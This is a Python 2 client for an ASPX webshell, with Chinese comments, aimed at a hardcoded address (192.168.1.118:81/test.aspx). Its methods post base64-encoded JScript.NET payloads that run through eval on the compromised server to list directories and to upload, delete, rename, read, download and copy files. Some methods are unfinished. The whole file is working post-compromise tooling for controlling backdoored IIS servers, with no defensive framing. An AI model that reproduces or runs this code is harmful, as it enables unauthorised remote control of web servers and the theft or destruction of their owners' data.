#! /usr/bin/env python
#! -*-coding:utf-8 -*-
'''
    注意 路径必须用.replace('\\', '\\\\')转换线
'''

import os
import sys
import urllib
import urllib2
import requests
import base64
import re

shell = "http://192.168.1.118:81/test.aspx"
class aspxshell:
    pass


class FileManage:

    #浏览文件目录
    def GetFilePath(self, path):
        filelist = re.compile(r'file:([\s\S]+?)\ttime:([\s\S]+?)\tsize:([\s\S]+?)\t\n')
        dirlist = re.compile(r"dir:([\s\S]+?)\ttime:([\s\S]+?)\t\n")
        code = '''
        var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIEQ9U3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoOTM2KS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTt2YXIgbT1uZXcgU3lzdGVtLklPLkRpcmVjdG9yeUluZm8oRCk7dmFyIHM9bS5HZXREaXJlY3RvcmllcygpO3ZhciBQOlN0cmluZzt2YXIgaTtmdW5jdGlvbiBUKHA6U3RyaW5nKTpTdHJpbmd7cmV0dXJuIFN5c3RlbS5JTy5GaWxlLkdldExhc3RXcml0ZVRpbWUocCkuVG9TdHJpbmcoInl5eXktTU0tZGQgSEg6bW06c3MiKTt9Zm9yKGkgaW4gcyl7UD1EK3NbaV0uTmFtZTtSZXNwb25zZS5Xcml0ZSgiZGlyOiIrc1tpXS5OYW1lKyIvXHQiKyJ0aW1lOiIrVChQKSsiXHRcbiIpO31zPW0uR2V0RmlsZXMoKTtmb3IoaSBpbiBzKXtQPUQrc1tpXS5OYW1lO1Jlc3BvbnNlLldyaXRlKCJmaWxlOiIrc1tpXS5OYW1lKyJcdCIrInRpbWU6IitUKFApKyJcdCIrInNpemU6IitzW2ldLkxlbmd0aCsiXHQtXG4iKTt9")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.End();
        '''.strip()
        code += "&{0}".format(urllib.urlencode({'z1':base64.b64encode(path.replace('\\', '\\\\'))}))
        # self.filesave(code, 'tmp.txt')
        data =  Spider.post(code)
        list = []
        if dirlist.search(data) != None:
            list.append(dirlist.findall(data))
        if filelist.search(data) != None:
            list.append(filelist.findall(data))
        print self.ShowRule(list)
        del code

    def UploadFile(self, localfile, remotepath):
        code = '''
        Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFA6U3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDkzNikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MSJdKSk7dmFyIFo6U3RyaW5nPVJlcXVlc3QuSXRlbVsiejIiXTt2YXIgQjpieXRlW109bmV3IGJ5dGVbWi5MZW5ndGgvMl07Zm9yKHZhciBpPTA7aTxaLkxlbmd0aDtpKz0yKXtCW2kvMl09Ynl0ZShDb252ZXJ0LlRvSW50MzIoWi5TdWJzdHJpbmcoaSwyKSwxNikpO312YXIgZnM6U3lzdGVtLklPLkZpbGVTdHJlYW09bmV3IFN5c3RlbS5JTy5GaWxlU3RyZWFtKFAsU3lzdGVtLklPLkZpbGVNb2RlLkNyZWF0ZSk7ZnMuV3JpdGUoQiwwLEIuTGVuZ3RoKTtmcy5DbG9zZSgpO1Jlc3BvbnNlLldyaXRlKCIxIik7")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
        '''.strip()
        with open(localfile, 'rb') as file:
            data = file.read()
        filestream = ""
        for line in range(len(data)):
            filestream += "%02x" % ord(data[line])
        suffix =  os.path.splitext(localfile)
        remotepath += os.path.split(suffix[0])[1] + suffix[1]  #自动填上文件名
        code += "&{0}&z2={1}".format(urllib.urlencode({'z1':base64.b64encode(remotepath.replace('\\', '\\\\'))}), filestream)
        data = Spider.post(code)
        del code, suffix
        if  "->|1|<-" in data:
            print "upload ok"

    def DeleteFile(self, path):
        code = '''
        Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFA6U3RyaW5nPVJlcXVlc3QuSXRlbVsiejEiXTtpZihTeXN0ZW0uSU8uRGlyZWN0b3J5LkV4aXN0cyhQKSl7U3lzdGVtLklPLkRpcmVjdG9yeS5EZWxldGUoUCx0cnVlKTt9ZWxzZXtTeXN0ZW0uSU8uRmlsZS5EZWxldGUoUCk7fVJlc3BvbnNlLldyaXRlKCIxIik7")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
        '''.strip()
        code += "&{0}".format(urllib.urlencode({'z1':path}))
        data = Spider.post(code)
        del code
        if "->|1|<-" in data:
            print "Delete File ok"

    #todo 需要解决访问网页500的错误
    def RenameFile(self, oldname, newname):
        code = '''
        Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIHNyYz1SZXF1ZXN0Lkl0ZW1bInoxIl0sZHN0PVJlcXVlc3QuSXRlbVsiejIiXTtpZiAoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoc3JjKSl7U3lzdGVtLklPLkRpcmVjdG9yeS5Nb3ZlKHNyYyxkc3QpO31lbHNle1N5c3RlbS5JTy5GaWxlLk1vdmUoc3JjLGRzdCk7fVJlc3BvbnNlLldyaXRlKCIxIik7")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
        '''.strip()
        suffix =  os.path.dirname(oldname)
        newname = suffix + os.sep + newname
        code += "&{0}&{1}".format(urllib.urlencode({'z1':oldname.replace('\\', '\\\\')}), urllib.urlencode({'z2':newname.replace('\\', '\\\\')}))
        code =  code.replace('+', '%20')
        with open('E:\\Python27\\code\\tools\\tmp.txt', 'w') as file:
            file.write(code)
        # print Spider.post(code)
        del suffix, code

    #todo 同上
    def ReadFile(self, path):
        code ='''
        var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFA9U3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoOTM2KS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTt2YXIgbT1uZXcgU3lzdGVtLklPLlN0cmVhbVJlYWRlcihQLEVuY29kaW5nLkRlZmF1bHQpO1Jlc3BvbnNlLldyaXRlKG0uUmVhZFRvRW5kKCkpO20uQ2xvc2UoKTs%3D")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);};
        '''.strip()
        code += "&z1={0}".format(base64.b64encode(path.replace('\\', '\\\\')))
        print Spider.post(code)
        del code

    #todo 同上
    def DownloadFile(self, path):
        code = '''
        Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("UmVzcG9uc2UuV3JpdGVGaWxlKFJlcXVlc3QuSXRlbVsiejEiXSk7")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("|<-");Response.End();
        '''.strip()
        code += "&{0}".format(urllib.urlencode({'z1':path.replace('\\', '\\\\')}))
        code = code.replace('+', '%20')
        with open('E:\\Python27\\code\\tools\\tmp.txt', 'w') as file:
            file.write(code)
        print Spider.post(code)
        del code

    def CopyFile(self, oldfile, newfile):
        code ='''
        Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFM9UmVxdWVzdC5JdGVtWyJ6MSJdO3ZhciBEPVJlcXVlc3QuSXRlbVsiejIiXTtmdW5jdGlvbiBjcChTOlN0cmluZyxEOlN0cmluZyl7aWYoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoUykpe3ZhciBtPW5ldyBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyhTKTt2YXIgaTt2YXIgZj1tLkdldEZpbGVzKCk7dmFyIGQ9bS5HZXREaXJlY3RvcmllcygpO1N5c3RlbS5JTy5EaXJlY3RvcnkuQ3JlYXRlRGlyZWN0b3J5KEQpO2ZvciAoaSBpbiBmKVN5c3RlbS5JTy5GaWxlLkNvcHkoUysiXFwiK2ZbaV0uTmFtZSxEKyJcXCIrZltpXS5OYW1lKTtmb3IgKGkgaW4gZCljcChTKyJcXCIrZFtpXS5OYW1lLEQrIlxcIitkW2ldLk5hbWUpO31lbHNle1N5c3RlbS5JTy5GaWxlLkNvcHkoUyxEKTt9fWNwKFMsRCk7UmVzcG9uc2UuV3JpdGUoIjEiKTs%3D")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
        '''.strip()
        code += "&{0}&{1}".format(urllib.urlencode({'z1':oldfile.replace('\\', '\\\\')}), urllib.urlencode({'z2':newfile.replace('\\', '\\\\')}))
        print Spider.post(code)
        if "->|1|<-" in Spider.post(code):
            print "copy ok"
        del code


    def showrwx(self, num):
        permx = {1:'--x', 2:'-w-', 4:'r--', 7:"rwx"}
        if num in permx.keys():
            return permx[num]
        elif num == 3 :
            return "-wx"
        elif num == 5:
            return "r-x"
        elif num == 6:
            return "rw-"
        else:
            return "rwx"
        return string

    def ShowRule(self, list):
        string = "\nperm\t\tsize\t\t\tdate\t\t\tfile\n"
        if len(list) == 2:   # 匹配的目录下有文件 也有文件夹
            for num in range(2):
                for line in list[num]:
                    print line
                    string += "{0}".format('-')
                    if len(line) == 3:   #如果匹配到size的话
                        string += "\t\t{0}".format(line[2])
                    else:
                        string += "\t\t{0}".format('--')
                    string += "\t\t{0}".format(line[1])
                    string += "\t\t{0}\n".format(line[0])
        elif len(list) == 1: # 这里是只有文件 或者只有文件夹
             for line in list[0]:
                string += "{0}".format('-')
                if len(line) == 4:
                    string += "\t{0}".format(line[2])
                else:
                    string += "\t{0}".format('--')
                string += "\t\t{0}".format(line[1])
                string += "\t{0}\n".format(line[0])
        else:
            string += "-\t\t-\t\t-\t\t."
        return string

    def filesave(self, data, name):
        with open(name, 'w') as file:
            file.write(data)

class Spider:
    @staticmethod
    def post(data):
        header = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN;'
        'rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14'}
        req = requests.post(shell, data=data, headers=header)
        return req.content

    @staticmethod
    def get(url, data):
        html = requests.get(url)

if __name__ == '__main__':
    t = FileManage()
    t.CopyFile("C:\\Inetpub\\toor\\test.txt", "C:\\Inetpub\\toor\\2asp\\test.txt")
